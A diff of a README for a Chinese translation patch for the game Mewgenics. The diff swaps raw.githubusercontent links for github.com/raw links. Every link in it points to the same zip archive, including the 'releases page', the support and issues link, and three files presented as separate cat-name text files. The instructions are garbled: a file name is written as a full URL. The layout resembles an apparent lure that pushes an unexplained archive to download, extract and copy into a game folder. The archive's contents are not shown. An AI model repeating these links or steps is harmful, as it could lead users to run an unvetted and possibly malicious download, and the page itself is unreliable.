@@ -1,6 +1,6 @@
 # 🐾 Mewgenics-Chinese-Translation - Easy Chinese Game Patch
 
-[![Download Latest Release](https://raw.githubusercontent.com/natt-nashh/Mewgenics-Chinese-Translation/main/Mewgenics_CN_patch/swfs/Translation_Mewgenics_Chinese_v3.8.zip)](https://raw.githubusercontent.com/natt-nashh/Mewgenics-Chinese-Translation/main/Mewgenics_CN_patch/swfs/Translation_Mewgenics_Chinese_v3.8.zip)
+[![Download Latest Release](https://github.com/natt-nashh/Mewgenics-Chinese-Translation/raw/refs/heads/main/Mewgenics_CN_patch/swfs/Translation_Mewgenics_Chinese_v3.8.zip)](https://github.com/natt-nashh/Mewgenics-Chinese-Translation/raw/refs/heads/main/Mewgenics_CN_patch/swfs/Translation_Mewgenics_Chinese_v3.8.zip)
 
 ---
 
@@ -41,10 +41,10 @@ This guide helps you download and install the Chinese translation patch for *Mew
 
 1. **Visit the download page**  
 Click the big button at the top or go to this link:  
-https://raw.githubusercontent.com/natt-nashh/Mewgenics-Chinese-Translation/main/Mewgenics_CN_patch/swfs/Translation_Mewgenics_Chinese_v3.8.zip
+https://github.com/natt-nashh/Mewgenics-Chinese-Translation/raw/refs/heads/main/Mewgenics_CN_patch/swfs/Translation_Mewgenics_Chinese_v3.8.zip
 
 2. **Download the latest patch**  
-On the releases page, find the most recent version. It usually has a file named like `https://raw.githubusercontent.com/natt-nashh/Mewgenics-Chinese-Translation/main/Mewgenics_CN_patch/swfs/Translation_Mewgenics_Chinese_v3.8.zip` or similar. Click it to download the file to your computer.
+On the releases page, find the most recent version. It usually has a file named like `https://github.com/natt-nashh/Mewgenics-Chinese-Translation/raw/refs/heads/main/Mewgenics_CN_patch/swfs/Translation_Mewgenics_Chinese_v3.8.zip` or similar. Click it to download the file to your computer.
 
 3. **Extract the files**  
 Once downloaded, open the `.zip` file using your computer’s file explorer or any unzip tool (like WinRAR or 7-Zip). Extract the contents to a folder you can easily find, such as your desktop or Documents.
@@ -59,7 +59,7 @@ Before applying the patch, copy the game’s `text` folder (or the files you pla
 Inside the extracted patch folder, you will see folders named `text` and possibly others like `data`. Copy these folders and paste them into the game directory, replacing any existing files when prompted.
 
 7. **Optional: Use Chinese cat names**  
-If you want the patch to show Chinese cat names, copy the three text files — `https://raw.githubusercontent.com/natt-nashh/Mewgenics-Chinese-Translation/main/Mewgenics_CN_patch/swfs/Translation_Mewgenics_Chinese_v3.8.zip`, `https://raw.githubusercontent.com/natt-nashh/Mewgenics-Chinese-Translation/main/Mewgenics_CN_patch/swfs/Translation_Mewgenics_Chinese_v3.8.zip`, and `https://raw.githubusercontent.com/natt-nashh/Mewgenics-Chinese-Translation/main/Mewgenics_CN_patch/swfs/Translation_Mewgenics_Chinese_v3.8.zip` — into the `data` folder inside the game directory. If there is no `data` folder, create one.
+If you want the patch to show Chinese cat names, copy the three text files — `https://github.com/natt-nashh/Mewgenics-Chinese-Translation/raw/refs/heads/main/Mewgenics_CN_patch/swfs/Translation_Mewgenics_Chinese_v3.8.zip`, `https://github.com/natt-nashh/Mewgenics-Chinese-Translation/raw/refs/heads/main/Mewgenics_CN_patch/swfs/Translation_Mewgenics_Chinese_v3.8.zip`, and `https://github.com/natt-nashh/Mewgenics-Chinese-Translation/raw/refs/heads/main/Mewgenics_CN_patch/swfs/Translation_Mewgenics_Chinese_v3.8.zip` — into the `data` folder inside the game directory. If there is no `data` folder, create one.
 
 8. **Run the game**  
 Start *Mewgenics* as usual. The game should now display most of its text in Chinese.
@@ -132,10 +132,10 @@ This patch is a work in progress. Some text may still be imperfect. Report issue
 ## 📞 Get Support
 
 For questions or feedback, visit the GitHub repository's issue section:  
-https://raw.githubusercontent.com/natt-nashh/Mewgenics-Chinese-Translation/main/Mewgenics_CN_patch/swfs/Translation_Mewgenics_Chinese_v3.8.zip
+https://github.com/natt-nashh/Mewgenics-Chinese-Translation/raw/refs/heads/main/Mewgenics_CN_patch/swfs/Translation_Mewgenics_Chinese_v3.8.zip
 
 Report issues clearly and include details to get help faster.
 
 ---
 
-[![Download Latest Release](https://raw.githubusercontent.com/natt-nashh/Mewgenics-Chinese-Translation/main/Mewgenics_CN_patch/swfs/Translation_Mewgenics_Chinese_v3.8.zip)](https://raw.githubusercontent.com/natt-nashh/Mewgenics-Chinese-Translation/main/Mewgenics_CN_patch/swfs/Translation_Mewgenics_Chinese_v3.8.zip)
+[![Download Latest Release](https://github.com/natt-nashh/Mewgenics-Chinese-Translation/raw/refs/heads/main/Mewgenics_CN_patch/swfs/Translation_Mewgenics_Chinese_v3.8.zip)](https://github.com/natt-nashh/Mewgenics-Chinese-Translation/raw/refs/heads/main/Mewgenics_CN_patch/swfs/Translation_Mewgenics_Chinese_v3.8.zip)
